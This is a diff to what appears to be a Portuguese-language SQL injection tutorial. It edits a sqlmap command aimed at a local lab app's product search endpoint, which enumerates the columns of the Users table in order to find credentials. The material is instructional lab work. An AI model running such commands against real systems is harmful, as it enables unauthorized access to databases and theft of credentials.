@@ -173,7 +173,7 @@ Aqui temos que:
 
 Quando executamos isso no nosso teste, foi possível descobrir as tabelas existentes no banco de dados. Foi possível descobrir a tabela Users e, por isso, vamos focar nela para tentarmos descobrir credenciais. Para isso, executa-se o seguinte comando: 
 
-```python3 sqlmap.py -u "http://localhost:3000/rest/products/search?q=test" --dbms=sqlite --prefix "'))" --suffix "--" --level=5 --risk=3 --batch -T users --columns```
+```python3 sqlmap.py -u "http://localhost:3000/rest/products/search?q=test" --dbms=sqlite --prefix "'))" --suffix "--" --level=5 --risk=3 -T users --columns```
 
 - ```-T Users```: Define a tabela alvo.
 
